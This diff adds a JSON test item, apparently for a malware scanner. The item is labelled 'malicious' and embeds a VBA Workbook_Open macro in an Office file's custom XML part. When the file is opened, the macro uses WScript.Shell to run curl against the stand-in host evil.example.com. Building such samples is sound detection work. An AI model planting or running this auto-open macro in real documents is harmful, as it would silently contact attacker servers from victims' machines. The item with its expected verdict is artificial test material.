@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-office::92::binary-variations::0",
+  "base_sample_id": "exp::document-office::92",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": -2014534571,
+  "content": "{\n  \"format\": \"office\",\n  \"customXml\": {\n    \"partName\": \"ppt/presentation.xml\",\n    \"content\": \"<root><field name=\\\"custom\\\">Private Sub Workbook_Open()\\n  CreateObject(\\\"WScript.Shell\\\").Run \\\"curl http://evil.example.com/\\\"\\nEnd Sub\\n</field></root>\"\n  }\n}",
+  "content_hash": "a39e2e3c71272d10ea938f32c2691dbab02bd339addb9a32c2322f6793522a82",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:office-custom-xml",
+  "difficulty": "advanced"
+}
